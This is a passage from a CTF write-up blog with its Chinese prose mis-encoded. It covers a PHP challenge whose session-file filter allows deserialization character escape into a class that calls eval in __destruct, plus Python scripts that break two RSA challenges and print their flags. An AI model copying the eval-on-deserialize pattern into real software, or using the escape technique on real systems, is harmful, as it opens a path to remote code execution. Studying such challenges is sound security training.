éšæœºçš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterSensitiveFunctions</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sessionFile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getSessionFilePath</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sessionFile</span>)) &#123;</span><br><span class="line">            <span class="variable">$sessionData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$sessionFile</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;sensitiveFunctions <span class="keyword">as</span> <span class="variable">$function</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$sessionData</span>, <span class="variable">$function</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$sessionData</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$function</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$sessionData</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sessionFile</span>, <span class="variable">$sessionData</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Sensitive functions have been filtered from the session file.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Session file not found.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œä¹Ÿæœ‰ç‚¹å„¿é‡è¦ï¼Œæœ‰è¯»å– -&gt; æ›¿æ¢ -&gt; å†™å…¥ï¼Œå¹¶ä¸”æ˜¯æ“ä½œ session çš„æ–‡ä»¶ï¼Œæ„Ÿè§‰æ˜¯å­—ç¬¦é€ƒé€¸ï¼Œå˜å°‘çš„é‚£ç§ã€‚</p><p>â€‹è¿™é‡Œå­˜åœ¨ eval å‡½æ•°ï¼Œéœ€è¦ç›´æ¥å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åè§¦å‘ <code>__destruct</code> .</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ç°åœ¨å°±æ˜¯çœ‹çœ‹è§¦å‘ååºåˆ—åŒ–çš„æ–¹æ³•ã€‚å¤§ä½¬ä»¬è¯´ï¼Œå¯ä»¥é€šè¿‡è¿½åŠ å†™å…¥ï¼Œå¤§ä½¬ç”¨çš„æ˜¯ password æ•°ç»„å»é€ƒé€¸çš„ï¼Œè¿™é‡Œå…·ä½“åŸç†ä¸æ˜¯å¾ˆæ‡‚ï¼Œåæ­£æœ‰é™„ä»¶ï¼Œå…ˆè®°å½•ä¸‹ï¼Œä¹‹åæ£é¼“:</p><p><img data-src="https://i-blog.csdnimg.cn/direct/ae98b430553b49d78d78b3f4e9681058.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img data-src="https://i-blog.csdnimg.cn/direct/7899de5fe03643afbcc30815a260aeaf.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Cryptoï¼š</h1><h2 id="eazyrsa"><a class="markdownIt-Anchor" href="#eazyrsa">#</a> eazyrsaï¼š</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"># encoding:utf-8</span><br><span class="line">from Crypto.Util.number import bytes_to_long, long_to_bytes</span><br><span class="line">from gmpy2 import mpz, iroot, powmod, invert, is_prime</span><br><span class="line">import sys</span><br><span class="line">import multiprocessing as mp</span><br><span class="line"></span><br><span class="line"># å®šä¹‰å¸¸é‡</span><br><span class="line">N = mpz(</span><br><span class="line">    &#x27;67962725468240199924103144864951334845750492508509360358636648068909779932072313362607631417524914992411826230276465100489023746209605790020210412575433464887238013738989770872867041592441153421617243161413094177629581581728221687772551567927241071007480087793370382177952900925657974338348428988433092737432689512506966089398873760401212521089061934975582692308605433023613521500237258699626587149952370997420510392932840377408736864097301789914658244266522930092113493152991783027162871212338968297436073316959569822974289536559300512091342692975133379473145882007983357289924135373382264527866381118893476257705939&#x27;)</span><br><span class="line"># gæ˜¯ä¸€ä¸ª500ä½æ•°ï¼Œä¸”gæ•´é™¤p-1å’Œq-1</span><br><span class="line">g = mpz(</span><br><span class="line">    &#x27;3235645591686044532495326878291617484542045511433360748778013933565021819649890342389737893735574764418484922895778834144345295691799766302763199373647&#x27;)</span><br><span class="line">e = 65537</span><br><span class="line">C = mpz(</span><br><span class="line">    &#x27;7918937034819399210460701361082120267249016865135589044938397478179178418982216265766430882604707450651405790878761026681351233717846491757101684210544361607883043938000941498442897699091016071609425252346011280078699567193949155766516051130050592046343488075564740812480634431357869210712013396437065989799117830247228129120071415956115563715118301273810713118159274551107354918579047901176471910532333125717712607469726900731370186233984133546278420585661042017307325998441634272568791745798269084955686428143476025911093137683806174746625559312685862694783475952178855060639359433340135424849663386199035593137765&#x27;)</span><br><span class="line"></span><br><span class="line"># è®¡ç®—è¾…åŠ©å˜é‡ï¼Œä½¿ç”¨æ•´æ•°é™¤æ³• //</span><br><span class="line">h = (N - 1) // g</span><br><span class="line">u = h // g</span><br><span class="line">v = h % g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def worker_search(params):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    å·¥ä½œè¿›ç¨‹å‡½æ•°ï¼Œç”¨äºåœ¨æŒ‡å®šçš„rå’ŒsèŒƒå›´å†…æœç´¢c_exponentã€‚</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    r_start, r_end, s_start, s_end, D, b, final, N = params</span><br><span class="line">    for r in range(r_start, r_end):</span><br><span class="line">        target_exponent = r * D</span><br><span class="line">        for s in range(s_start, s_end):</span><br><span class="line">            c_exponent = target_exponent + s</span><br><span class="line">            current = powmod(b, c_exponent, N)</span><br><span class="line">            if current == final:</span><br><span class="line">                return c_exponent</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve_c_parallel(num_processes=4, D_multiplier=2):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    ä½¿ç”¨å¤šè¿›ç¨‹å¹¶è¡ŒåŒ–æœç´¢cï¼Œä½¿å¾— b^c â‰¡ final mod Nã€‚</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    sqrt_N = iroot(N, 2)[0]</span><br><span class="line">    C_approx = sqrt_N // (g * g)</span><br><span class="line"></span><br><span class="line">    b = powmod(2, g, N)</span><br><span class="line">    final = powmod(b, u, N)</span><br><span class="line"></span><br><span class="line">    for i in range(2, int(C_approx) + 1):</span><br><span class="line">        # è®¡ç®—D</span><br><span class="line">        D_root, is_exact = iroot(C_approx, 2)</span><br><span class="line">        D = (D_root + 1) * i</span><br><span class="line"></span><br><span class="line">        # å®šä¹‰rå’Œsçš„æœç´¢èŒƒå›´ï¼Œå¹¶å°†rçš„èŒƒå›´åˆ’åˆ†ä¸ºå¤šä¸ªå—ä»¥å¹¶è¡Œå¤„ç†</span><br><span class="line">        step = D // num_processes if D &gt; num_processes else 1</span><br><span class="line">        tasks = []</span><br><span class="line">        for p in range(num_processes):</span><br><span class="line">            r_start = p * step</span><br><span class="line">            r_end = (p + 1) * step if p &lt; num_processes - 1 else D</span><br><span class="line">            s_start = 0</span><br><span class="line">            s_end = D</span><br><span class="line">            params = (r_start, r_end, s_start, s_end, D, b, final, N)</span><br><span class="line">            tasks.append(params)</span><br><span class="line"></span><br><span class="line">        # åˆ›å»ºè¿›ç¨‹æ± å¹¶åˆ†é…ä»»åŠ¡</span><br><span class="line">        with mp.Pool(processes=num_processes) as pool:</span><br><span class="line">            results = pool.map(worker_search, tasks)</span><br><span class="line"></span><br><span class="line">        # æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•å·¥ä½œè¿›ç¨‹æ‰¾åˆ°äº†c_exponent</span><br><span class="line">        for res in results:</span><br><span class="line">            if res is not None:</span><br><span class="line">                print(f&quot;Solution found: c = &#123;res&#125;&quot;)</span><br><span class="line">                return res</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    c = solve_c_parallel()</span><br><span class="line">    if c is not None:</span><br><span class="line">        print(&quot;c:&quot;, c)</span><br><span class="line"></span><br><span class="line">        # è®¡ç®—Aå’ŒB</span><br><span class="line">        A = u - c</span><br><span class="line">        B = v + c * g</span><br><span class="line"></span><br><span class="line">        # æ±‚è§£äºŒæ¬¡æ–¹ç¨‹x^2 - Bx + A = 0</span><br><span class="line">        discriminant = B * B - 4 * A</span><br><span class="line">        sqrt_discriminant, is_perfect_square = iroot(discriminant, 2)</span><br><span class="line">        if not is_perfect_square or sqrt_discriminant * sqrt_discriminant != discriminant:</span><br><span class="line">            print(&quot;åˆ¤åˆ«å¼ä¸æ˜¯å®Œå…¨å¹³æ–¹æ•°ã€‚&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        x = (B + sqrt_discriminant) // 2</span><br><span class="line">        y = (B - sqrt_discriminant) // 2</span><br><span class="line"></span><br><span class="line">        # è®¡ç®—aå’Œb</span><br><span class="line">        a_val = x // 2</span><br><span class="line">        b_val = y // 2</span><br><span class="line"></span><br><span class="line">        # è®¡ç®—på’Œq</span><br><span class="line">        p = 2 * g * a_val + 1</span><br><span class="line">        q = 2 * g * b_val + 1</span><br><span class="line"></span><br><span class="line">        # éªŒè¯på’Œqæ˜¯å¦ä¸ºç´ æ•°</span><br><span class="line">        if not is_prime(p):</span><br><span class="line">            print(&quot;p ä¸æ˜¯ç´ æ•°ã€‚&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">        if not is_prime(q):</span><br><span class="line">            print(&quot;q ä¸æ˜¯ç´ æ•°ã€‚&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        # è®¡ç®—phi(N)</span><br><span class="line">        phi_N = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line">        # è®¡ç®—ç§é’¥æŒ‡æ•°d</span><br><span class="line">        try:</span><br><span class="line">            d = invert(e, phi_N)</span><br><span class="line">        except ZeroDivisionError:</span><br><span class="line">            print(&quot;eä¸phi(N)ä¸äº’è´¨ï¼Œæ— æ³•æ‰¾åˆ°é€†å…ƒã€‚&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        # è§£å¯†å¯†æ–‡</span><br><span class="line">        m = powmod(C, d, N)</span><br><span class="line">        decrypted_message = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line">        print(&quot;è§£å¯†æ¶ˆæ¯:&quot;, decrypted_message)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;æœªæ‰¾åˆ°cçš„è§£ã€‚&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>Solution found: c = 51589121<br>c: 51589121<br> è§£å¯†æ¶ˆæ¯: bâ€™flag {bf82d1cd-67b1-42bd-a7b5-f119f0246dfe}â€™</p><p>æœ‰åŸé¢˜</p><p><span class="exturl" data-url="aHR0cHM6Ly9mNjFkLmdpdGh1Yi5pby9jcnlwdG8vUlNBL2h1d2FuZ2JlaTIwMTlfQ3J5cHRvMS8=">https://f61d.github.io/crypto/RSA/huwangbei2019_Crypto1/</span></p><h2 id="apbq"><a class="markdownIt-Anchor" href="#apbq">#</a> apbqï¼š</h2><p>ç¬¬ä¸€éƒ¨åˆ†</p><p><em>Ï•</em>=<em>n</em>1âˆ’<em>h</em>1+1=<em>p</em>Ã—<em>q</em>âˆ’(<em>p</em>+<em>q</em>)+1=(<em>p</em>âˆ’1)(<em>q</em>âˆ’1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import gmpy2</span><br><span class="line"></span><br><span class="line">hint1 = 18978581186415161964839647137704633944599150543420658500585655372831779670338724440572792208984183863860898382564328183868786589851370156024615630835636170</span><br><span class="line">n1,e1 = (89839084450618055007900277736741312641844770591346432583302975236097465068572445589385798822593889266430563039645335037061240101688433078717811590377686465973797658355984717210228739793741484666628342039127345855467748247485016133560729063901396973783754780048949709195334690395217112330585431653872523325589, 65537)</span><br><span class="line">c1 = 23664702267463524872340419776983638860234156620934868573173546937679196743146691156369928738109129704387312263842088573122121751421709842579634121187349747424486233111885687289480494785285701709040663052248336541918235910988178207506008430080621354232140617853327942136965075461701008744432418773880574136247</span><br><span class="line">phi = n1-hint1+1</span><br><span class="line">d = gmpy2.invert(e1,phi)</span><br><span class="line">m = pow(c1,d,n1)</span><br><span class="line">flag1 =long_to_bytes(m)</span><br><span class="line">print(flag1)</span><br><span class="line">#b&#x27;flag&#123;yOu_can_&#x27;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒéƒ¨åˆ†</p><p>æƒ³åŠæ³•å› å¼åˆ†è§£ä¸€ä¸ª RSA æ¨¡æ•° ğ‘›=ğ‘Ã—ğ‘<em>n</em>=<em>p</em>Ã—<em>q</em></p><p>å…ˆæ±‚å‡º p,q</p><p>ç„¶åå®šæ ¼çŸ©é˜µ<br> DownUniderCTF 2023 ç›¸ä¼¼</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Rvd25VbmRlckNURi9DaGFsbGVuZ2VzXzIwMjNfUHVibGljL2Jsb2IvbWFpbi9jcnlwdG8vYXBicS1yc2EtaWkvc29sdmUvc29sdi5zYWdl">https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/crypto/apbq-rsa-ii/solve/solv.sage</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line"># n, c, hints</span><br><span class="line">c = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line"></span><br><span class="line">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line"></span><br><span class="line">V = hints = [18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096, 16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962, 17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991, 25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567, 22620929075309280405649238349357640303875210864208854217420509497788451366132889431240039164552611575528102978024292550959541449720371571757925105918051653777519219003404406299551822163574899163183356787743543, 20448555271367430173134759139565874060609709363893002188062221232670423900235907879442989619050874172750997684986786991784813276571714171675161047891339083833557999542955021257408958367084435326315450518847393, 16581432595661532600201978812720360650490725084571756108685801024225869509874266586101665454995626158761371202939602347462284734479523136008114543823450831433459621095011515966186441038409512845483898182330730, 23279853842002415904374433039119754653403309015190065311714877060259027498282160545851169991611095505190810819508498176947439317796919177899445232931519714386295909988604042659419915482267542524373950892662544, 16542280976863346138933938786694562410542429842169310231909671810291444369775133082891329676227328401108505520149711555594236523078258701726652736438397249153484528439336008442771240980575141952222517324476607, 17054798687400834881313828738161453727952686763495185341649729764826734928113560289710721893874591843482763545781022050238655346441049269145400183941816006501187555169759754496609909352066732267489240733143973, 22115728663051324710538517987151446287208882441569930705944807337542411196476967586630373946539021184108542887796299661200933395031919501574357288914028686562763621166172668808524981253976089963176915686295217, 19324745002425971121820837859939938858204545496254632010818159347041222757835937867307372949986924646040179923481350854019113237172710522847771842257888083088958980783122775860443475680302294211764812636993025, 17269103712436870749511150569030640471982622900104490728908671745662264368118790999669887094371008536628103283985205839448583011077421205589315164079023370873380480423797655480624151812894997816254147210406492, 17365467616785968410717969747207581822018195905573214322728668902230086291926193228235744513285718494565736538060677324971757810325341657627830082292794517994668597521842723473167615388674219621483061095351780, 20823988964903136690545608569993429386847299285019716840662662829134516039366335014168034963190410379384987535117127797097185441870894097973310130525700344822429616024795354496158261293140438037100429185280939, 19068742071797863698141529586788871165176403351706021832743114499444358327620104563127248492878047796963678668578417711317317649158855864613197342671267006688211460724339403654215571839421451060657330746917459, 20089639597210347757891251257684515181178224404350699015820324544431016085980542703447257134320668961280907495580251880177990935443438799776252979843969984270461013888122703933975001704404129130156833542263882, 22344734326131457204500487243249860924828673944521980798994250859372628295695660076289343998351448667548250129358262592043131205967592613289260998148991388190917863322690137458448696392344738292233285437662495, 22688858027824961235755458925538246922604928658660170686458395195714455094516952026243659139809095639584746977271909644938258445835519951859659822660413616465736923822988993362023001205350387354001389518742538, 21286046487289796335501643195437352334100195831127922478044197411293510360710188581314023052580692810484251118253550837525637065385439859631494533102244585493243972819369812352385425700028640641292410326514111, 21542729548465815605357067072323013570796657575603676418485975214641398139843537820643982914302122976789859817102498484496409546012119998359943274203338400776158986205776474024356567247508744784200354385060666, 22319592382753357951626314613193901130171847776829835028715915533809475362288873045184870972146269975570664009921662023590318988850871708674240304838922536028975978222603171333743353770676344328056539379240160, 25195209191944761648246874631038407055240893204894145709996399690807569652160721616011712739214434932639646688187304865397816188999592774874989401871300784534538762135830014255425391132306536883804201055992313, 18257804244956449160916107602212089869395886846990320452133193087611626919926796845263727422042179229606817439442521540784268169177331707314788427670112999551683927934427716554137597798283300120796277229509678, 20293403064916574136692432190836928681820834973375054705153628740577159076332283715581047503287766236543327123639746352358718218140738999496451259789097826888955418315455420948960832865750253988992454128969953, 15967654820584966012628708475666706277218484919923639492431538068059543232562431059752700377242326527417238151501168940191488179144049286512652111172149113549072003881460743035279388672984805823560897688895124, 25144187979876039024245879200325843092774389926620026124061775431569974232758799200333888039013494603721065709195353330350750055309315207499741437181094874894647736904055829877859906318073991986020178158776286, 15736932921640444103019961538951409924080453868073105830403926861058056351553271238438325117113945341892868641345117717666354739204401152657265824568724844930574396801692131746182948347887298330990039956813130, 18831072673439732764722762485733622234889447953507582396819704359771208236721692820362137219509611319088756045211407777880521726782697895768017460064889670066178710804124631128581556314122255564861269062385337, 23800437561684813552661749774840752013501533683948618798811470214669024646396165487093720960221009038817909066075238937189371227098032581450466402462014437421254375846263830927945343485988463525070074913720710, 24402191070622494792723290726249952159888270689258801831518209605331984684494095167423722682814769395395011136124403802097229547003802312444913008194461779426175966774202219703164060353710247619639616444797670, 20215481513831963554421686543560596857659844027486522940060791775984622049024173363533378455076109165728144576719015392033536498353094895564917644840994662704362121549525329105205514332808950206092190939931448, 18384453917605955747212560280232547481041600196031285084598132475801990710125754705645482436436531608696373462641765399622296314590071558616193035939108523357020287896879479452040171765916716377102454266933226, 21890401344164908103930010123434944359446535642544335610455613014563290097498740447164765588532234051104173227090428486681237432196639010849051113283297943367655458678533223039415083212229970648958070799280218, 18379893441293694747570620009241814202936873442370354246029979042247705730610190888710981918183390028386451290137755339890329474403224043675724851314770861939082447728194632548864823398818221526652331319263027, 18715827130228986951360013590464775001019026913384718876134449689773600060962392738619405370033085704046027397895627933844824630723286144367800484157574548819065406118338665931032779491897783504790669824301288, 13588739911708699123450670852772302012518315143187739886523841133752009403411431627334135210166268158490674049617489193734568451811305631563767138879895461211915128972052001136464325219117009268526575020143259, 18506039912943821193373920483847347155611306173368341979655092778147169768984477236224526786441466933360500418090210912574990962709452725122792963919616633389125605160796446674502416801964271004625701238202575, 22167985517547342184812919437069844889650448522260359154086923601900060998572245598167213217022051141570075284051615276464952346620430587694188548679895095556459804921016744713098882496174497693878187665372865, 21507363933875318987283059841465034113263466805329282129011688531718330888226928182985538861888698160675575993935166249701145994333840516459683763957425287811252135418288516497258724668090570720893589001392220, 20250321586608105267884665929443511322540360475552916143405651419034772061789298150974629817817611591100450468070842373341756704300393352252725859102426665187194754280129749402796746118608937061141768301995522, 16104259151024766025645778755951638093681273234415510444173981198301666343334808614748361662637508091511498829253677167171091582942780017355912433497214576425697459483727777273045993446283721290714044600814203, 14560242181138184594433372530956542527312169507277535425067427080573272033961044062335960097446781943943464713852520415535775461964590009720592053626735276833191667395201287169782350381649400286337671320581068, 16239347596615402699390026749150381714807445218767496868569282767673828662340774349530405347667558555781433774705139593469838946201218537641296949822639509296966092138954685186059819628696340121356660166937131, 21344472317634795288252811327141546596291633424850284492351783921599290478005814133560171828086405152298309169077585647189366292823613547973428250604674234857289341613448177246451956695700417432794886277704716, 16053809990112020217624905718566971288375815646771826941011489252522755953750669513046736360397030033178139614200701025268874379439106827823605937814395162011464610496629969260310816473733828751702925621950679, 18917855883623050190154989683327838135081813638430345099892537186954876489710857473326920009412778140451855952622686635694323466827034373114657023892484639238914593012175120540210780102536003758794571846502397, 22690171278715056779052233972642657173540399024770527983659216197108042021644328773010698851143953503599329885607621773816718008861742027388432534850163666629476315340137626681994316866368449548292328156728206, 21087818524872480052313215092436868441694786060866149491087132591272640372512484925209820065536439188250579925233059144898601140234767300574307770064543499923712729705795392684173268461519802573563186764326797, 18439753470094841291394543396785250736332596497190578058698960152415339036714664835925822942784700917586270640813663002161425694392259981974491535370706560550540525510875465091384383255081297963169390777475352, 20105719699015744146039374208926740159952318391171137544887868739518535254000803811729763681262304539724253518465850883904308979964535242371235415049403280585133993732946919550180260852767289669076362115454200, 17251599484976651171587511011045311555402088003441531674726612079301412643514474016351608797610153172169183504289799345382527665445027976807805594288914226822374523878290416047130731166794970645275146679838899, 23027331991437585896233907022469624030630702237261170259290872847355304456043379238362120518409085840638396736666056992747627271193089116095167049248270541979716594671069985183070290375121270398623215587207529, 18158149685496169798299129683009221264185608469410295069411669832919646968324946121757411511373498747604679198739125835462814352243797919744572086307939585501566092705355693015625009717017077302201663788208609, 18276153196656501517216055049560959047263892309902154534799806637704337317207294332426798932144785240877892837491213916540255237702169595754963908689566362060228840286531616263506272071630209104758589482803348, 19830654702835464289082520892939657653574451119898587213320188332842291005863699764597454403874285715252681820027919359194554863299385911740908952649966617784376852963552276558475217168696695867402522508290055, 15349828226638644963106414986240676364822261975534684137183044733508521003843559094515387144949811552173241406076270015291925943459603622043168219534080772937297911323165839870364550841685270125556125756627553, 20923687596111161976478930953796496927811701530608223491138786355445002217973253897724452954815797952200740069102515860924306246841340715110620719064010080520601890251137419840158983682372232110885549732743013, 21095748006022412831703352650023882351218414866517568822818298949510471554885207645049385966827210564667371665855668707424105040599599901165292360321667007968065708796593851653085339928947755081203265281357013, 20136320433636422315432754195821125224777716034031656342233368000257459497472596860252592531939146543685406198978058242599116859263546329669263543660114747385041549283367183026001454445297981439938401547228229, 16496919752274418275948572022974868132658743151124597724312835413857298109100258912203517423633396955060591787380445877361136405137884456764770035346437177846666365911942996404514058688909577420388537479730705, 13788728438272498164727737074811797093818033799836159894472736480763530670013682288670889124484670336660448907074673625466218166413315342420667608074179975422284472184048790475129281850298519112884101776426380, 24852871485448795332267345793743281093931161235481251209948049584749441451621572752080662697610253315331335180611651946374137068256112152253681972406000252076016099200912670370417045090034045383991812756120791, 18663346319122078996775762643035864683521213720864038756854558668694021987970601131985163948257100423991091156649638455828855082098689641225427227191064496066436196910238564311309556938903101074363279783438714, 21400068681031931459396470039651524575262457489792894764406364952394476440804779651233022862527636114968325782197380721095406628084183336358459476006267416033892771932528688312375109463803215034905281657962293, 16044158155847172030103761204572942507195578382208455423846603003318483484698088948486132040995746837257705704187725306831142305215342467016564452582165866039427184607605673304595194959499145031211096109534167, 